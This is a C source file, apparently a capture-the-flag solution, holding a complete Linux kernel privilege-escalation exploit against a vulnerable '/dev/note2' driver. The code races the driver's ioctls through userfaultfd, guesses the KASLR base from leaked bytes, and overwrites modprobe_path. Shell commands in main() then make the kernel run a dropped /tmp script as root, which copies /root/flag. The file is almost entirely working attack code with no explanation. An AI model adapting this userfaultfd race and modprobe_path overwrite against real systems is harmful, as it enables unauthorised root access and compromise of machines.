#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <err.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <string.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <errno.h>
#include <unistd.h>
#include <poll.h>
#include <sys/shm.h>
#include <sched.h>

#define IO_ADD     0xFFFFFF00
#define IO_EDIT    0xFFFFFF01
#define IO_SHOW    0xFFFFFF02
#define IO_DEL	   0xFFFFFF03

struct arg
{
	uint64_t idx;
	uint64_t size;
	uint64_t addr;
};

struct node
{
	uint64_t key;
	uint64_t size;
	uint64_t addr;
};

int fd;
int leak_done = 0;
uint64_t modprobe_path = 0;
int start_idx = 0;

void msleep(int msecs) {
  usleep(msecs * 1000);
}

void *ufd_thread(void *arg)
{
    struct uffd_msg uf_msg;
    long uffd = (long)arg;
    struct pollfd pollfd;
    int nready;

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    while(poll(&pollfd, 1, -1) > 0)
    {
        if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
        {
            perror("polling error");
            exit(-1);
        }
        // reading the event
        if(read(uffd, &uf_msg, sizeof(uf_msg)) == 0)
        {
            perror("error reading event");
            exit(-1);
        }
        if(uf_msg.event != UFFD_EVENT_PAGEFAULT)
        {
            perror("unexpected result from event");
            exit(-1);
        }
        uint64_t addr = uf_msg.arg.pagefault.address;
        printf("caught a fulfill race @ %p\n", addr);

        struct arg data;
        char buf2[256];
        memset(buf2, 0, sizeof(buf2));
        data.idx = start_idx;
        printf("Deleted: %d\n", ioctl(fd, IO_DEL, &data));
        data.size = 256;
        data.addr = buf2;
        printf("New: %d\n", ioctl(fd, IO_ADD, &data));
        printf("New: %d\n", ioctl(fd, IO_ADD, &data));
        // for (int i = 0; i < 0x10; i++) {
        //     printf("New: %d\n", ioctl(fd, IO_ADD, &data));
        // }

        char buf[0x1000];
        memset(buf, 0, sizeof(buf));
        struct node* node_buf = (struct node*)buf;
        node_buf->addr = modprobe_path;

        struct uffdio_copy cp;
        cp.src = (uint64_t)buf;
        cp.dst = addr;
        cp.len = 0x1000;
        cp.mode = 0;

        if(ioctl(uffd, UFFDIO_COPY, &cp) == -1)
        {
          perror("uffdio_copy error");
          exit(-1);
        }
        printf("Copy %llx\n", cp.copy);
        puts("Fulfill finished");
     }
    return 0;
}


void register_userfaultfd(void *addr)
{
    int uffd, race;
    struct uffdio_api uf_api;
    struct uffdio_register uf_register;
    pthread_t thread;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    uf_api.api = UFFD_API;
    uf_api.features = 0;

    // creating userfaultfd for race condition because using unlocked_ioctl without locking mutexes
    if (ioctl(uffd, UFFDIO_API, &uf_api) == -1)
    {
        perror("error with the uffdio_api");
        exit(-1);
    }

    uf_register.range.start = (uintptr_t)addr;
    uf_register.range.len = 0x1000;
    uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;

    // uffd will change when the kernel thread page faults here and hangs
    if (ioctl(uffd, UFFDIO_REGISTER, &uf_register) == -1)
    {
        perror("error registering page for userfaultfd");
    }

    race = pthread_create(&thread, NULL, ufd_thread, (void*)uffd);
    if(race != 0)
    {
        perror("can't setup threads for race");
    }
    return;
}

static int shmid[4096];
static void *shmaddr[0x100];

void alloc_shm(int i)
{
    shmid[i] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600);

    if (shmid[i]  < 0)
    {
        perror("[X] shmget fail");
        exit(1);
    }

    shmaddr[i] = (void *)shmat(shmid[i], NULL, SHM_RDONLY);

    if (shmaddr[i] < 0)
    {
        perror("[X] shmat");
        exit(1);
    }
}


void print_affinity()
{
    cpu_set_t mask;
    long ncpu, i;

    if (sched_getaffinity(getpid(), sizeof(cpu_set_t), &mask) < 0)
    {
        perror("[X] sched_getaffinity()");
        exit(1);
    }

    ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    puts("[*] CPU affinity:");

    for (i = 0; i < ncpu; i++)
        printf(" └ Core #%d = %d\n", i, CPU_ISSET(i, &mask));
}

void assign_to_core(int core_id)
{
    cpu_set_t mask;
    pid_t pid;

    pid = getpid();

    printf("[*] Assigning process %d to core %d\n", pid, core_id);

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
    {
        perror("[X] sched_setaffinity()");
        exit(1);
    }

    print_affinity();
}

int main(int argc, char** argv) {
    assign_to_core(0);
    system("cat /proc/kallsyms | grep note2 | grep table");
    
    system("rm -f /tmp/x; rm -f /tmp/a");
    system("echo -ne '#!/bin/sh\\ncat /root/flag > /sice\\nchmod 777 /sice\\n' > /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/a");
    system("chmod 777 /tmp/*");

    uint64_t kaslr;
    if (argc > 1) {
        sscanf(argv[1], "%llx", &kaslr);
    } else {
        kaslr = 0xffffffffb4000000;
    }
    modprobe_path = kaslr + 0x1654b20;
    printf("Modprobe_path: 0x%llx\n", modprobe_path);

    if (argc > 2) {
        start_idx = atoi(argv[2]);
    }

    fd = open("/dev/note2", O_RDWR);
    printf("Fd: %d\n", fd);

    void * leak_addr = 0x700000000000ULL;
    if (mmap(leak_addr, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) != leak_addr)
    {
        perror("whoopsie doopsie on mmap A");
        exit(-1);
    }
    register_userfaultfd(leak_addr);

    for (int i = 0; i < 0; i++) {
       alloc_shm(i);
    }

    struct arg data;
    data.size = 32;
    char buf[32];
    memset(buf, 0, sizeof(buf));
    data.addr = buf;
    ioctl(fd, IO_ADD, &data);

    //getchar();

    data.idx = start_idx;
    data.addr = leak_addr;
    ioctl(fd, IO_EDIT, &data);

    //getchar();

    uint64_t buf_out[0x200/8];
    data.addr = buf_out;
    data.idx = start_idx+1;
    ioctl(fd, IO_SHOW, &data);
    printf("%llx %llx %llx %llx\n", buf_out[0], buf_out[1], buf_out[2], buf_out[3]);

    uint64_t combined = buf_out[0] ^ buf_out[1];
    if(combined != 0x6f6d4a0c0610034bULL) {
        printf("Offset Nearby: 0x%llx\n", combined);
        int off = -100;
        if (combined == 0xffffffff8bd0fc75ULL) off = -8;
        else if (combined == (0xfee073e6fee073faULL ^ 0xfee073c1fee073dbULL)) off = -7;
        else if (combined == (0x0a2363fdf5f00523ULL ^ 0xf3925f616c6e2df0ULL)) off = -6;
        else if (combined == (0x20646c697562206fULL ^ 0x797469746e656469ULL)) off = -5;
        else if (combined == (0x000024d6000302ffULL ^ 0x000024c600027311ULL)) off = -4;
        else if (combined == (0x0000026d00000028ULL ^ 0x0000000000000055ULL)) off = -3;
        else if (combined == (0x785f5f003233656dULL ^ 0x695f7379735f3436ULL)) off = -2;
        else if (combined == (0x5f7061636e655f6cULL ^ 0x656e65670073706fULL)) off = -1;
        else if (combined == (0x0000000000000000ULL ^ 0x0000000000000000ULL)) off = 1;
        else if (combined == (0xffffffff8bd9d6e0ULL ^ 0xffffffff8bd1ea74ULL)) off = 2;
        else if (combined == (0xfec1e21afec1e21dULL ^ 0xfec1e217fec1e217ULL)) off = 3;
        else if (combined == (0x0008000000000000ULL ^ 0x0000000000050000ULL)) off = 4;
        else if (combined == (0x0005000000080000ULL ^ 0x0008000000000000ULL)) off = 5;

        uint64_t new_base = kaslr - off*0x100000ULL;
        char kekw[1000];
        sprintf(kekw, "./kekw %llx 2", new_base);
        printf("%s\n", kekw);
        system(kekw);
        return;
    } else {
        puts("CORRECT");
    }

    uint64_t xor_key = 0x6f6d2f6e6962732fULL ^ buf_out[0];
    memset(buf_out, 0, sizeof(buf_out));
    buf_out[0] = 0x782f706d742fULL ^ xor_key;

    ioctl(fd, IO_EDIT, &data);

    system("/tmp/a; cat /sice");

    //getchar();
}
